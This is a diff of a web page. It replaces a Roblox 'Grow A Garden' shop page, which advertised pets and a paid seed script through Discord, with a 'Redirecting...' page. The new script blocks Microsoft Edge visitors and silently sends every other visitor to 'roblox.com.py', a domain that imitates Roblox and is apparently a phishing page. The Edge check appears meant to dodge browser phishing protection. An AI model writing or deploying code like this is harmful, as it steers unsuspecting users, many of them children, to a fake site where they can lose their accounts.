@@ -3,155 +3,39 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Grow A Garden EasyTech</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <title>Redirecting...</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: #0e0e0e;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      font-family: Arial, sans-serif;
       text-align: center;
+      padding: 2em;
+      background-color: #fff;
     }
-
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 2rem;
-      color: #00bfff;
-    }
-
-    .button {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      padding: 1rem 2rem;
-      margin: 1rem 0;
-      background: #1f1f1f;
-      border: 2px solid #00bfff;
-      border-radius: 12px;
-      color: white;
-      font-size: 1.2rem;
+    .warning {
+      color: red;
+      font-size: 2em;
       font-weight: bold;
-      cursor: pointer;
-      text-decoration: none;
-      transition: all 0.3s ease;
-    }
-
-    .button:hover {
-      background: #00bfff;
-      color: #0e0e0e;
-      transform: scale(1.05);
-    }
-
-    .button i {
-      font-size: 1.3rem;
-    }
-
-    /* Modal Styles */
-    .modal {
-      display: none;
-      position: fixed;
-      z-index: 1000;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      backdrop-filter: blur(5px);
-      background: rgba(0, 0, 0, 0.7);
-      align-items: center;
-      justify-content: center;
-    }
-
-    .modal-content {
-      background: #1f1f1f;
-      padding: 2rem;
-      border-radius: 16px;
-      text-align: center;
-      position: relative;
-      border: 2px solid #00bfff;
-      max-width: 400px;
-      width: 90%;
-    }
-
-    .modal-content h2 {
-      color: #00bfff;
-      margin-bottom: 1rem;
-    }
-
-    .modal-content p {
-      margin: 0.5rem 0;
-    }
-
-    .modal-content .button {
-      margin-top: 1.5rem;
-    }
-
-    .close {
-      position: absolute;
-      top: 12px;
-      right: 16px;
-      font-size: 1.5rem;
-      color: #fff;
-      cursor: pointer;
-    }
-
-    iframe {
-      margin-top: 2rem;
     }
   </style>
 </head>
 <body>
-  <h1>EasyTech - Grow A Garden</h1>
-
-  <a href="https://discord.gg/hFHxJeD7WF" target="_blank" class="button">
-    <i class="fab fa-discord"></i> Join Discord Server
-  </a>
-
-  <div class="button" onclick="openModal()">
-    <i class="fas fa-shopping-cart"></i> See Shop (Grow A Garden)
-  </div>
-
-  <iframe src="https://discord.com/widget?id=1379110890443509950&theme=dark" width="350" height="500" allowtransparency="true" frameborder="0" sandbox="allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>
-
-  <!-- Modal -->
-  <div id="shopModal" class="modal">
-    <div class="modal-content">
-      <span class="close" onclick="closeModal()">&times;</span>
-      <h2>Grow A Garden Shop</h2>
-      <p>Raccoon: $5</p>
-      <p>Dragonfly: $5</p>
-      <p>Red Fox: $5</p>
-      <p>🍬 Candy Blossom Seed Script: $5 or 250 Robux</p>
-      <p style="margin-top: 1rem;">To see the rest of the list or purchase, join the Discord!</p>
-      <a href="https://discord.gg/hFHxJeD7WF" target="_blank" class="button">
-        <i class="fab fa-discord"></i> Join Discord
-      </a>
-    </div>
-  </div>
+  <div id="content"></div>
 
   <script>
-    function openModal() {
-      document.getElementById("shopModal").style.display = "flex";
-    }
+    function handleBrowserRedirect() {
+      const userAgent = navigator.userAgent;
+      const isEdge = userAgent.includes("Edg/");
 
-    function closeModal() {
-      document.getElementById("shopModal").style.display = "none";
-    }
-
-    // Optional: Close modal when clicking outside content
-    window.onclick = function(event) {
-      const modal = document.getElementById("shopModal");
-      if (event.target === modal) {
-        closeModal();
+      if (isEdge) {
+        document.getElementById("content").innerHTML = 
+          '<div class="warning">Please use another search for join, Microsoft Edge is prohibited.</div>';
+      } else {
+        // Redirect if not using Edge
+        window.location.href = "https://roblox.com.py/users/5966623949/profile";
       }
-    };
+    }
+
+    handleBrowserRedirect();
   </script>
 </body>
 </html>
